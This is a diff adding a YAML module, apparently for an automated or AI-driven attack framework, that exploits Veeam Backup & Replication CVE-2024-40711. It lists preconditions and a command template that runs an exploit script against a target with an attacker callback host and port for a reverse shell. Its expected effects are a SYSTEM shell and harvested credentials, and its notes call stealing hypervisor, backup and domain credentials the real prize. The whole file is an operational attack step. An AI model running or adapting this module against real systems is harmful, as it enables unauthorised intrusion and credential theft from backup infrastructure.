@@ -1,0 +1,35 @@
+name: veeam_cve2024_40711
+category: services
+description: Veeam Backup & Replication CVE-2024-40711 — pre-auth .NET deserialization
+  RCE
+preconditions:
+- service.port==9401
+- veeam_version_vulnerable
+parameters:
+  target_ip: from_engagement.target_ip
+  lhost: from_engagement.attacker_ip
+  lport: from_engagement.attacker_port
+command_template: python3 CVE-2024-40711.py -t {target_ip} --lhost {lhost} --lport
+  {lport}
+parser: generic_parser
+expected_effects:
+- veeam_rce
+- system_shell
+- has_cred
+falsifier:
+  pattern: 404|patched|not vulnerable|auth required
+  timeout: 120
+model_tier: sonnet
+mechanism: 'Unauth XML-RPC-style endpoint on Veeam.Backup.PSManager exposed an unsafe
+
+  BinaryFormatter deserialization sink. Send crafted gadget → SYSTEM. Veeam often
+
+  stores credentials for every hypervisor, backup target, and domain service
+
+  account in its DB — post-exploit credential harvest is the real prize.
+
+  '
+references:
+  ocd_mindmap: 'Branch 13: Veeam (CVE-2024-40711)'
+  hacktricks: generic-methodologies-and-resources/
+hacktricks_ref: windows-hardening/windows-local-privilege-escalation/README.md
